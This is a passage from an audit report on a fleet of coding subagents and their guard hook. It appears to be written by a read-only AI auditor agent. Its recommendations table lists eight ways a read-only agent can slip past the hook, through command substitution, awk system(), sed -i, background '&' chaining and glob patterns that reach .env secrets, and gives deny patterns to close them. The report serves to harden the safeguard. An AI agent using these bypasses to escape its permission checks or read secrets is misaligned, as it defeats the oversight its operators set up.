- **Reviewer discipline holds.** All 22 non-orchestrator agents carry `disallowedTools` including
  `Agent`; the 20 reviewers/advisors all carry `Edit, NotebookEdit` as well. `review-fixer.md:9`
  correctly carries `Edit`/`Write` and is the only agent with `hooks … fleet-guard.mjs writer`.
  `migration-auditor.md:9` and `release-auditor.md:9` additionally deny `Write` — correct for pure
  advisors, but it means neither can produce a `findings/<domain>.md` if the orchestrator ever
  dispatches them inside a review run (`PROTOCOL.md:48`). Worth an explicit note in their prompts.
- **Hook paths all resolve.** All 24 `hooks:` blocks point at
  `${CLAUDE_PROJECT_DIR}/.claude/hooks/fleet-guard.mjs`, which exists, with the correct mode
  argument: `readonly` for 23, `writer` for `review-fixer` alone. (`task-tracker` has none — BLOCK-1.)
- **Hook matcher was never widened.** All 24 use `matcher: "Bash|Read|Write|Edit|NotebookEdit"`.
  The 2026-08-14 audit recommended extending it to include `Grep|Glob|WebFetch|WebSearch`
  (`FLEET-AUDIT.md:541`); that was not applied. It is currently **mitigated** — `settings.json`
  uses the wider matcher — but only in `secrets` mode, so a `Grep` with `path:` pointing outside a
  reviewer's scope is unguarded by the `readonly` policy.
- **Prompt quality is strong for the 16 reviewers**, weak for the advisors. All 16 core+domain
  reviewers carry a "How you will be wrong" section, a ranked concrete method, and repo-specific
  paths. **Five do not:** `meta/fiji-advisor.md`, `meta/review-fixer.md`, `meta/task-tracker.md`,
  `release/incident-reporter.md`, `release/migration-auditor.md`, `release/release-auditor.md`.
  The three release advisors are also the three shortest files in the fleet (46, 46, 50 lines vs a
  72–100 median) — they are close to the generic-advice threshold that produces generic findings.
  This was recommended on 2026-08-14 (`FLEET-AUDIT.md:558`) and not applied.
- **No agent has drifted toward generic advice.** Zero dead file paths across 75 distinct
  code-file citations; every reviewer names concrete call sites (`ffmpegLimit.ts`, `pathSafety.ts`,
  `stripe-webhook.controller.ts`, `SimBridgeContract.ts`, `inlineDriver.ts`). The prompt corpus is
  in good shape; the problem is the **numbers and the provider list**, not the method.
- **The 2026-08-14 audit's own recommendations were only half-applied.** Applied: guard v2 rewrite,
  `settings.json`, `stack.md` table count, migration counts, Groq qualification in `stack.md`,
  `fiji.md` location warning. **Not applied:** D1 (Groq in the agent), D4 (`71-file`), D5 (`128`),
  D8 (job names), hook matcher, "How you will be wrong" for five agents. A fleet audit whose
  recommendations are not applied re-accrues the same drift plus interest — D5 has now been wrong
  twice in a row, by a different amount each time.

---

## 7. Recommended edits, per file

*Described, not applied. I am read-only and the guard enforces it. `review-fixer` or the user applies these.*

### Blocking — do these before trusting the run in flight
| File | Edit |
|---|---|
| `.claude/agents/meta/task-tracker.md:1-6` | Add the standard `hooks: PreToolUse → node ${CLAUDE_PROJECT_DIR}/.claude/hooks/fleet-guard.mjs readonly` block and `disallowedTools: Edit, NotebookEdit, Agent`. Add `color`, `effort: medium`, `memory: project` for consistency. Then add it to `README.md:45-55`, `PROTOCOL.md` §3, and `review-orchestrator.md`'s dispatch table — or delete the file. It is untracked; decide deliberately. |
| `.claude/hooks/fleet-guard.mjs:155` | `/fleet-guard\.mjs\|--version/` → `/fleet-guard(\.test)?\.mjs\|--version/` so the regression suite can run under the guard. |
| `.claude/hooks/fleet-guard.mjs:246-252` | Replace the repo-root-anchored agent-memory prefixes with a suffix test: allow any resolved path containing `/.claude/agent-memory/` or `/.claude/agent-memory-local/`. Fixes memory writes from `podcast-saas/client-web/.claude/agent-memory/`. |
| `.claude/agents/meta/fiji-advisor.md:28-30` | Replace the `for … do … done` probe with `ls -d ./fiji ../fiji ~/cebu/fiji ~/fiji 2>/dev/null` (verb `ls` is allowlisted). Alternative: add `for`, `do`, `done`, `if`, `then`, `fi`, `[` to `READ_VERBS`. |
| `.claude/agents/domain/llm-pipeline-reviewer.md:14` | Remove `skills: claude-api` (no such skill exists), or create `.claude/skills/claude-api/SKILL.md`. |

### Guard hardening — close G1–G8
| File | Edit |
|---|---|
| `fleet-guard.mjs:110-113` | Add `&` to the `segments()` split: `.split(/\|\|\|&&\|[;\n\|&]/)`. Closes **G1**. |
| `fleet-guard.mjs:109-122` | Before splitting, extract and recursively verb-check the contents of `$( … )` and `` ` … ` ``, or deny both outright in `readonly` (a reviewer has no legitimate need). Closes **G2, G3**. |
| `fleet-guard.mjs:141-179` | Add an `awk` clause rejecting `system(`, `\|&`, `getline <`, `printf … >`, `close(` — or drop `awk` from `READ_VERBS` (`grep`/`sed`/`jq` cover reviewer needs). Closes **G4**. |
| `fleet-guard.mjs:147` | `sed` check → `/(^\|\s)(-[a-zA-Z]*i\b\|--in-place)/`. Closes **G5**. |
| `fleet-guard.mjs:92-95` | In `commandTouchesSecret()`, additionally deny any token matching `/(^\|\/)\.en[^\/]*[*?\[{]/` or containing `{` with `.env` inside — i.e. treat a glob/brace that *could* expand onto a secret as a secret. Closes **G6**. This is the one to do first: it is the only new bypass that defeats the `secrets` floor. |
| `fleet-guard.mjs:137,141-179` | Add flag checks: deny `eslint` with `--fix`; deny `tsc` with `--outDir`/`-b`/`--build`/`--declaration`. Closes **G7, G8**. |
| `.claude/hooks/fleet-guard.test.mjs` | Add regression cases for G1–G8 so they cannot silently reopen. Current suite is 44/44 and covers none of them. |
| `.claude/settings.json` | Consider promoting `readonly` (not just `secrets`) for the review session, or document loudly that the fleet's guarantees require accepting workspace trust — see §5.6. |

### Drift — `reference/stack.md`
| Line | Edit |
|---|---|
| `:12` | `Last verified: 2026-08-14 against feat/agent-fleet-upgrade` → `2026-08-16 against main @ 2d187e3`. |
| `:68` | `128 *.test.ts` → **`136`** (`_archive/` excluded; 139 including it). |
| `:96` | Replace the three job **filenames** with the **11 `JobName` values** from `queue/types.ts:11`, and note that `jobs/corpus.ingest.ts` is **not** a registered job. |
| `:105` | `(31 backfill/audit scripts)` → **`(29 scripts, plus lib/ and __tests__/)`**. |
| `:112` | Split `ops/ship/**` ownership by concern instead of naming two owners — see C1. |
| `:130-131` | Re-stamp the migration-audit verification to `main @ 2d187e3`, 2026-08-16 (the claim re-verified true; only the stamp was stale). |
| §3 table | Add rows for `backend-api/src/controllers/{sim-public,sim-rum,stubs}.ts`, `backend-api/src/services/firebase.ts`, `podcast-saas/md-files/**`, `podcast-saas/references/**`, `podcast-saas/ops/release/src/**`, `deploy/docker-compose.capture.yml`, `client-web/{e2e,scripts,docs}`. |
| §5 (`:151-164`) | Add `REVALIDATE_SECRET`, `TRIGGER_SECRET_KEY`, `FIRECRAWL_API_KEY`, `LLAMAPARSE_API_KEY` — or state explicitly that the list is illustrative and `.env.example` is authoritative. |

### Drift — agent files
| File:line | Edit |
|---|---|
| `domain/llm-pipeline-reviewer.md:3` | `Anthropic/OpenAI/Gemini/Groq` → `Anthropic/OpenAI/Gemini`. Add one sentence: "Groq (`groq-sdk`) is the speech-to-text engine in `services/captions/CaptionService.ts` and `services/ingestion/AudioIngester.ts` — it is **not** an LLM provider and has no `GroqProvider`." **Highest-value single edit in this report.** |
| `core/security-reviewer.md:24` | `four LLM providers` → `three LLM providers`. |
| `domain/dependency-auditor.md:40` | `the four LLM SDKs` → `the three LLM SDKs (@anthropic-ai/sdk, openai, @google/genai) plus groq-sdk (ASR, not an LLM)`. |
| `core/database-reviewer.md:36` | `schema.ts (53 pgTables)` → **`schema.ts (52 pgTables, 145 uuid columns)`**. |
| `core/database-reviewer.md:3` | `the 71-file migration runner` → **`the 58-entry hardcoded migration runner (71 .sql files on disk: 58 forward + 12 rollback + 1 commented-out phase2-schema.sql)`**. |
| `core/database-reviewer.md:36` | `migrations/ (71 .sql)` → `migrations/ (71 .sql on disk; 58 in the runner list)`. |
| `core/test-quality-reviewer.md:21,70` | `128` → **`136`** in both places. |
| `reference/fiji.md:30` | Replace "local-disk fallback served via raw `path.join` ⚠️" with "local-disk fallback, contained by `safeLocalPath()`/`keyHasTraversal()` in `podcast-saas/backend-api/src/services/storage/pathSafety.ts` (verified 2026-08-16)". Then re-frame `fiji-advisor.md:77-79`'s canonical case from "fix the traversal" to "replace path-prefix publicness with a checked row property" — which is still a real gap. |
| `review/README.md:45` | `24 agents` → `25 agents` (or 24 after deleting `task-tracker`). |

### Coverage and ownership
| File | Edit |
|---|---|
| `core/backend-reviewer.md:33-38` | Add `scripts/**` to the enumerated scope with the destructive-by-default framing from `stack.md:105`. Remove the blanket `lib/**` and `podcast/` claims (O2, O3); replace with "the `podcast/` files not claimed by `llm-pipeline` or `media-pipeline`". Drop `seo/` **or** remove it from `llm-pipeline-reviewer.md:37` (O1) — pick one. |
| `release/release-auditor.md:24-29` | Either extend scope to `podcast-saas/ops/{release,ship}/src/**` as *source*, or say plainly that the source is out of scope so C1/C9 get assigned elsewhere. |
| `domain/config-deploy-reviewer.md:31-32` | Add `deploy/docker-compose.capture.yml` and the root `podcast-saas/docker-compose.yml`. |
| `core/frontend-reviewer.md:20-21` | Add `client-web/{scripts,docs}`; state that `client-web/e2e/**` belongs to `test-quality-reviewer`. |
| `core/test-quality-reviewer.md:21-23` | Add `client-web/e2e/**` and `**/__tests__/**` to scope explicitly (currently only the nine configs are named). |
| `domain/simulation-reviewer.md` / `domain/observability-reviewer.md` | Add a one-line tie-break for `sim-rum.controller.ts` (O4), in the style of `media-pipeline-reviewer.md:43-45`. |
| `review/PROTOCOL.md:105-127` | Add rows for: ship-conductor / release tooling **source**; operational scripts (`backend-api/src/scripts/**`); repo documentation currency (`md-files/`, `references/`, `CLAUDE.md`) — assign the last to `fleet-maintainer`, since stale docs are the drift bug class. Add the `task-tracker` row. |
| `meta/fiji-advisor.md`, `meta/review-fixer.md`, `release/{incident-reporter,migration-auditor,release-auditor}.md` | Add a "How you will be wrong" section — the five files that lack one. For the three release advisors also add a concrete method section; at 46–50 lines they are the thinnest prompts in the fleet. |
| `release/{migration-auditor,release-auditor}.md` | Note explicitly that `disallowedTools: Write` means they report inline and never produce `findings/<domain>.md` (`PROTOCOL.md:48`). |

---

*Read-only audit. No file outside this run directory was modified. Guard bypasses G1–G8 were
demonstrated against `fleet-guard.mjs` only — no command was executed and nothing was exfiltrated.*
